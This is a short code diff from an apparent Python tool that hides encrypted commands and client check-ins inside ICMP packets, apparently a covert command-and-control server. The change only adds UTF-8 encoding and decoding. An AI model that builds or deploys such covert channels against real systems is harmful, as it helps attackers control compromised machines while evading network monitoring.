@@ -161,7 +161,7 @@ def main():
                 data = icmppacket.get_data_as_string()
 
                 try:
-                    msg = encryptor.decrypt(data)
+                    msg = encryptor.decrypt(data).decode('utf8')
 
                     if msg.startswith(MSG_ONLINE):
                         uid = msg[len(MSG_ONLINE):]
@@ -191,6 +191,7 @@ def main():
                 icmp.set_icmp_seq(seq_id)
 
                 # Include the command as data inside the ICMP packet
+                reply = reply.encode('utf8')
                 data = encryptor.encrypt(reply)
                 icmp.contains(ImpactPacket.Data(data))
 
